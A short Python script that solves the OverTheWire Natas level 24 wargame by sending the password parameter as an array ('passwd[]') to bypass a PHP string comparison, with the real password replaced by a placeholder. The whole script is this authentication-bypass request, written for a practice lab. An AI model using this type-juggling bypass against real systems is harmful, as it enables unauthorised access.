import requests

url = "http://natas24.natas.labs.overthewire.org"
auth = ("natas24", "[PW_HERE]")

# Exploit: send passwd as an array
r = requests.get(url, params=[("passwd[]", "test")], auth=auth)

print(r.text)

		
